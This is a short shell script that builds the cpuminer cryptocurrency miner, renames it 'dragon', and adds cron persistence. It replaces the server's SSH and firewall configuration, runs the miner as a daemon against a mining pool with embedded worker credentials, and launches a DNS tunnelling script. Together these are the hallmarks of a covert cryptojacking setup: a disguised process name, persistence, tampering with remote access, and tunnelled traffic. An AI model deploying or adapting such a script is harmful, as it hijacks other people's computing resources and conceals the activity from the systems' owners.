#!/bin/sh
echo "export LC_ALL=en_US.UTF-8" >> /etc/profile
export LC_ALL=en_US.UTF-8
yum -y update
#yum -y groupinstall "Development Tools"
yum -y install git automake make curl-devel libcurl-devel gcc python-devel screen rsync wget
git clone https://github.com/pooler/cpuminer.git
cd cpuminer
./autogen.sh
./configure CFLAGS="-O3"
make
make install
cp minerd dragon
#git clone https://gist.github.com/de81d0e3847e2e334a0e.git
cd /root/macca/
crontab Cronmiine5
#Firewall goes Ong
#git clone https://github.com/alLi1n/macca.git
#cd /root/macca/
yes | cp sshd_config /etc/ssh/sshd_config
yes | cp iptables /etc/sysconfig/iptables
yes | cp ip6tables /etc/sysconfig/ip6tables
chkconfig iptables on
chkconfig ip6tables on
service sshd restart
service iptables restart
service ip6tables restart
#ifdown venet0:1
#killall stunnel
#pkill anytermd
#pkill saslauthd
#service saslauthd stop
#RUN my girl :)
/root/macca/cpuminer/dragon -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker515:1234gosok -D -B -R 151
cd /root/macca/
sh dnstunme.sh
